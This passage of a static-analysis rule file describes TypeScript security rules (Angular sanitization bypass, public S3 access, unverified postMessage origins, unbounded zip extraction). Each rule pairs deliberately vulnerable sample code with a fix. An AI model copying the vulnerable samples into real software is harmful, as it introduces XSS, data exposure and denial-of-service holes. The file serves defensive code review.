Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S6268": {
        "name": "Disabling Angular built-in sanitization is security-sensitive",
        "htmlDesc": "<p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework\nbefore they are inserted into the DOM.</p>\n<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting\nmalicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive\ninformation or impersonating other users.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The value for which sanitization has been disabled is user-controlled. </li>\n  <li> It’s difficult to understand how this value is constructed. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to\n  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li>\n  <li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li>\n  <li> Make sure to choose the correct <a href=\"https://angular.io/api/platform-browser/DomSanitizer\">DomSanitizer</a> \"bypass\" method based on the\n  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport { Component, OnInit } from '@angular/core';\nimport { DomSanitizer, SafeHtml } from \"@angular/platform-browser\";\nimport { ActivatedRoute } from '@angular/router';\n\n@Component({\n  template: '&lt;div id=\"hello\" [innerHTML]=\"hello\"&gt;&lt;/div&gt;'\n})\nexport class HelloComponent implements OnInit {\n  hello: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }\n\n  ngOnInit(): void {\n    let name = this.route.snapshot.queryParams.name;\n    let html = \"&lt;h1&gt;Hello \" + name + \"&lt;/h1&gt;\";\n    this.hello = this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport { Component, OnInit } from '@angular/core';\nimport { DomSanitizer } from \"@angular/platform-browser\";\nimport { ActivatedRoute } from '@angular/router';\n\n@Component({\n  template: '&lt;div id=\"hello\"&gt;&lt;h1&gt;Hello {{name}}&lt;/h1&gt;&lt;/div&gt;',\n})\nexport class HelloComponent implements OnInit {\n  name: string;\n\n  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }\n\n  ngOnInit(): void {\n    this.name = this.route.snapshot.queryParams.name;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> <a href=\"https://angular.io/guide/security\">Angular - Best Practices - Security</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6249": {
        "name": "Authorizing HTTP communications with S3 buckets is security-sensitive",
        "htmlDesc": "<p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>\n<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It\nmeans that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enforce HTTPS only access by setting <code>enforceSSL</code> property to <code>true</code></p>\n<h2>Sensitive Code Example</h2>\n<p>S3 bucket objects access through TLS is not enforced by default:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nconst bucket = new s3.Bucket(this, 'example'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nconst bucket = new s3.Bucket(this, 'example', {\n    bucketName: 'example',\n    versioned: true,\n    publicReadAccess: false,\n    enforceSSL: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit\">AWS documentation</a> - Enforce encryption\n  of data in transit </li>\n  <li> <a href=\"https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5\">AWS Foundational Security\n  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html\">AWS CDK version 2</a> - Bucket </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S6265": {
        "name": "Granting access to S3 buckets to all or authenticated users is security-sensitive",
        "htmlDesc": "<p>Predefined permissions, also known as <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">canned ACLs</a>,\nare an easy way to grant large privileges to predefined groups or users.</p>\n<p>The following canned ACLs are security-sensitive:</p>\n<ul>\n  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively \"read\" and \"read and write\" privileges to anyone, either\n  authenticated or anonymous (<code>AllUsers</code> group). </li>\n  <li> <code>AUTHENTICATED_READ</code> grants \"read\" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the\ncontext of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>\n<h2>Sensitive Code Example</h2>\n<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'bucket', {\n    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive\n});\n\nnew s3deploy.BucketDeployment(this, 'DeployWebsite', {\n    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'bucket', {\n    accessControl: s3.BucketAccessControl.PRIVATE\n});\n\nnew s3deploy.BucketDeployment(this, 'DeployWebsite', {\n    accessControl: s3.BucketAccessControl.PRIVATE\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">AWS Documentation</a> - Access control list (ACL)\n  overview (canned ACLs) </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html\">AWS Documentation</a> - Controlling access to a bucket with\n  user policies </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html\">AWS CDK version 2</a> - Class Bucket (construct) </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6270": {
        "name": "Policies authorizing public access to resources are security-sensitive",
        "htmlDesc": "<p>Resource-based policies granting access to all users can lead to information leakage.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The AWS resource stores or processes sensitive data. </li>\n  <li> The AWS resource is designed to be private. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the\ncontext of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>\n<h2>Sensitive Code Example</h2>\n<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\nimport { aws_s3 as s3 } from 'aws-cdk-lib'\n\nconst bucket = new s3.Bucket(this, \"ExampleBucket\")\n\nbucket.addToResourcePolicy(new iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"s3:*\"],\n    resources: [bucket.arnForObjects(\"*\")],\n    principals: [new iam.AnyPrincipal()] // Sensitive\n}))\n</pre>\n<h2>Compliant Solution</h2>\n<p>This policy allows only the authorized users:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\nimport { aws_s3 as s3 } from 'aws-cdk-lib'\n\nconst bucket = new s3.Bucket(this, \"ExampleBucket\")\n\nbucket.addToResourcePolicy(new iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"s3:*\"],\n    resources: [bucket.arnForObjects(\"*\")],\n    principals: [new iam.AccountRootPrincipal()]\n}))\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "typescript:S6275": {
        "name": "Using unencrypted EBS volumes is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the\nsecurity of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access\nto the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a\nhref=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\">all new volumes and snapshots</a>. Volumes created\nfrom snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The disk contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no\nfurther modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption\nglobally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security\nparameter will prevent any future unexpected security downgrade.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'unencrypted-explicit', {\n      availabilityZone: 'us-west-2a',\n      size: Size.gibibytes(1),\n      encrypted: false // Sensitive\n    });\n</pre>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'unencrypted-implicit', {\n      availabilityZone: 'eu-west-1a',\n      size: Size.gibibytes(1),\n    }); // Sensitive as encryption is disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html\">aws_cdk.aws_ec2.Volume</a>:</p>\n<pre>\nimport { Size } from 'aws-cdk-lib';\nimport { Volume } from 'aws-cdk-lib/aws-ec2';\n\nnew Volume(this, 'encrypted-explicit', {\n      availabilityZone: 'eu-west-1a',\n      size: Size.gibibytes(1),\n      encrypted: true\n    });\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html\">Amazon EBS encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "typescript:S2819": {
        "name": "Origins should be verified during cross-origin communications",
        "htmlDesc": "<p>Cross-origin communication allows different websites to interact with each other. This interaction is typically achieved through mechanisms like\nAJAX requests, WebSockets, or postMessage API. However, a vulnerability can arise when these communications are not properly secured by verifying\ntheir origins.</p>\n<h2>Why is this an issue?</h2>\n<p>Without origin verification, the target website cannot distinguish between legitimate requests from its own pages and malicious requests from an\nattacker’s site. The attacker can craft a malicious website or script that sends requests to a target website where the user is already\nauthenticated.</p>\n<p>This vulnerability class is not about a single specific user input or action, but rather a series of actions that lead to an insecure cross-origin\ncommunication.</p>\n<h3>What is the potential impact?</h3>\n<p>The absence of origin verification during cross-origin communications can lead to serious security issues.</p>\n<h4>Data Breach</h4>\n<p>If an attacker can successfully exploit this vulnerability, they may gain unauthorized access to sensitive data. For instance, a user’s personal\ninformation, financial details, or other confidential data could be exposed. This not only compromises the user’s privacy but can also lead to\nidentity theft or financial loss.</p>\n<h4>Unauthorized Actions</h4>\n<p>An attacker could manipulate the communication between websites to perform actions on behalf of the user without their knowledge. This could range\nfrom making unauthorized purchases to changing user settings or even deleting accounts.</p>\n<h2>How to fix it</h2>\n<p>When sending a message, avoid using <code>*</code> for the target origin (it means no preference). Instead define it explicitly so the message will\nonly be dispatched to this URI. When receiving the message, verify the orgin to be sure that it is sent by an authorized sender.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>When sending a message:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvar iframe = document.getElementById(\"testiframe\");\niframe.contentWindow.postMessage(\"hello\", \"*\"); // Noncompliant: * is used\n</pre>\n<p>When receiving a message:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nwindow.addEventListener(\"message\", function(event) { // Noncompliant: no checks are done on the origin property.\n  console.log(event.data);\n });\n</pre>\n<h4>Compliant solution</h4>\n<p>When sending a message:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvar iframe = document.getElementById(\"testiframe\");\niframe.contentWindow.postMessage(\"hello\", \"https://secure.example.com\");\n</pre>\n<p>When receiving a message:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nwindow.addEventListener(\"message\", function(event) {\n  if (event.origin !== \"http://example.org\")\n    return;\n\n  console.log(event.data)\n});\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> MDN web docs - <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage\">postMessage API</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/345\">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://github.com/npm/node-tar\">tar</a> module:</p>\n<pre>\nconst tar = require('tar');\n\ntar.x({ // Sensitive\n  file: 'foo.tar.gz'\n});\n</pre>\n<p>For <a href=\"https://github.com/cthackers/adm-zip\">adm-zip</a> module:</p>\n<pre>\nconst AdmZip = require('adm-zip');\n\nlet zip = new AdmZip(\"./foo.zip\");\nzip.extractAllTo(\".\"); // Sensitive\n</pre>\n<p>For <a href=\"https://stuk.github.io/jszip/\">jszip</a> module:</p>\n<pre>\nconst fs = require(\"fs\");\nconst JSZip = require(\"jszip\");\n\nfs.readFile(\"foo.zip\", function(err, data) {\n  if (err) throw err;\n  JSZip.loadAsync(data).then(function (zip) { // Sensitive\n    zip.forEach(function (relativePath, zipEntry) {\n      if (!zip.file(zipEntry.name)) {\n        fs.mkdirSync(zipEntry.name);\n      } else {\n        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {\n          fs.writeFileSync(zipEntry.name, content);\n        });\n      }\n    });\n  });\n});\n</pre>\n<p>For <a href=\"https://github.com/thejoshwolfe/yauzl\">yauzl</a> module</p>\n<pre>\nconst yauzl = require('yauzl');\n\nyauzl.open('foo.zip', function (err, zipfile) {\n  if (err) throw err;\n\n  zipfile.on(\"entry\", function(entry) {\n    zipfile.openReadStream(entry, function(err, readStream) {\n      if (err) throw err;\n      // TODO: extract\n    });\n  });\n});\n</pre>\n<p>For <a href=\"https://github.com/maxogden/extract-zip\">extract-zip</a> module:</p>\n<pre>\nconst extract = require('extract-zip')\n\nasync function main() {\n  let target = __dirname + '/test';\n  await extract('test.zip', { dir: target }); // Sensitive\n}\nmain();\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://github.com/npm/node-tar\">tar</a> module:</p>\n<pre>\nconst tar = require('tar');\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\n\nlet fileCount = 0;\nlet totalSize = 0;\n\ntar.x({\n  file: 'foo.tar.gz',\n  filter: (path, entry) =&gt; {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n      throw 'Reached max. number of files';\n    }\n\n    totalSize += entry.size;\n    if (totalSize &gt; MAX_SIZE) {\n      throw 'Reached max. size';\n    }\n\n    return true;\n  }\n});\n</pre>\n<p>For <a href=\"https://github.com/cthackers/adm-zip\">adm-zip</a> module:</p>\n<pre>\nconst AdmZip = require('adm-zip');\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nlet fileCount = 0;\nlet totalSize = 0;\nlet zip = new AdmZip(\"./foo.zip\");\nlet zipEntries = zip.getEntries();\nzipEntries.forEach(function(zipEntry) {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n    }\n\n    let entrySize = zipEntry.getData().length;\n    totalSize += entrySize;\n    if (totalSize &gt; MAX_SIZE) {\n        throw 'Reached max. size';\n    }\n\n    let compressionRatio = entrySize / zipEntry.header.compressedSize;\n    if (compressionRatio &gt; THRESHOLD_RATIO) {\n        throw 'Reached max. compression ratio';\n    }\n\n    if (!zipEntry.isDirectory) {\n        zip.extractEntryTo(zipEntry.entryName, \".\");\n    }\n});\n</pre>\n<p>For <a href=\"https://stuk.github.io/jszip/\">jszip</a> module:</p>\n<pre>\nconst fs = require(\"fs\");\nconst pathmodule = require(\"path\");\nconst JSZip = require(\"jszip\");\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\n\nlet fileCount = 0;\nlet totalSize = 0;\nlet targetDirectory = __dirname + '/archive_tmp';\n\nfs.readFile(\"foo.zip\", function(err, data) {\n  if (err) throw err;\n  JSZip.loadAsync(data).then(function (zip) {\n    zip.forEach(function (relativePath, zipEntry) {\n      fileCount++;\n      if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n      }\n\n      // Prevent ZipSlip path traversal (S6096)\n      const resolvedPath = pathmodule.join(targetDirectory, zipEntry.name);\n      if (!resolvedPath.startsWith(targetDirectory)) {\n        throw 'Path traversal detected';\n      }\n\n      if (!zip.file(zipEntry.name)) {\n        fs.mkdirSync(resolvedPath);\n      } else {\n        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {\n          totalSize += content.length;\n          if (totalSize &gt; MAX_SIZE) {\n            throw 'Reached max. size';\n          }\n\n          fs.writeFileSync(resolvedPath, content);\n        });\n      }\n    });\n  });\n});\n</pre>\n<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to\ndecide if the implementation is secure.</p>\n<p>For <a href=\"https://github.com/thejoshwolfe/yauzl\">yauzl</a> module</p>\n<pre>\nconst yauzl = require('yauzl');\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nyauzl.open('foo.zip', function (err, zipfile) {\n  if (err) throw err;\n\n  let fileCount = 0;\n  let totalSize = 0;\n\n  zipfile.on(\"entry\", function(entry) {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n      throw 'Reached max. number of files';\n    }\n\n    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.\n    // Alternatively, calculate the size from the readStream.\n    let entrySize = entry.uncompressedSize;\n    totalSize += entrySize;\n    if (totalSize &gt; MAX_SIZE) {\n      throw 'Reached max. size';\n    }\n\n    if (entry.compressedSize &gt; 0) {\n      let compressionRatio = entrySize / entry.compressedSize;\n      if (compressionRatio &gt; THRESHOLD_RATIO) {\n        throw 'Reached max. compression ratio';\n      }\n    }\n\n    zipfile.openReadStream(entry, function(err, readStream) {\n      if (err) throw err;\n      // TODO: extract\n    });\n  });\n});\n</pre>\n<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to\ndecide if the implementation is secure.</p>\n<p>For <a href=\"https://github.com/maxogden/extract-zip\">extract-zip</a> module:</p>\n<pre>\nconst extract = require('extract-zip')\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nasync function main() {\n  let fileCount = 0;\n  let totalSize = 0;\n\n  let target = __dirname + '/foo';\n  await extract('foo.zip', {\n    dir: target,\n    onEntry: function(entry, zipfile) {\n      fileCount++;\n      if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n      }\n\n      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.\n      // Alternatively, calculate the size from the readStream.\n      let entrySize = entry.uncompressedSize;\n      totalSize += entrySize;\n      if (totalSize &gt; MAX_SIZE) {\n        throw 'Reached max. size';\n      }\n\n      if (entry.compressedSize &gt; 0) {\n        let compressionRatio = entrySize / entry.compressedSize;\n        if (compressionRatio &gt; THRESHOLD_RATIO) {\n          throw 'Reached max. compression ratio';\n        }\n      }\n    }\n  });\n}\nmain();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S6245": {
        "name": "Disabling server-side encryption of S3 buckets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is\nread from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if\nthey were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure\nitself.</p>\n<p>There are three SSE options:</p>\n<ul>\n  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)\n    <ul>\n      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)\n    <ul>\n      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)\n    <ul>\n      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s\n      encryption keys. </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>\n<h2>Sensitive Code Example</h2>\n<p>Server-side encryption is not used:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'default'\n}); // Sensitive\n</pre>\n<p>Bucket encryption is disabled by default.</p>\n<h2>Compliant Solution</h2>\n<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    encryption: s3.BucketEncryption.KMS_MANAGED\n});\n\n# Alternatively with a KMS key managed by the user.\n\nnew s3.Bucket(this, 'id', {\n    encryption: s3.BucketEncryption.KMS_MANAGED,\n    encryptionKey: access_key\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html\">AWS documentation</a> - Protecting data using\n  server-side encryption </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html\">AWS CDK version 2</a> - BucketEncryption </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S6252": {
        "name": "Disabling versioning of S3 buckets is security-sensitive",
        "htmlDesc": "<p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3\nbucket.</p>\n<p>It can lead to unintentional or intentional information loss.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    versioned: false // Sensitive\n});\n</pre>\n<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>\n<h2>Compliant Solution</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    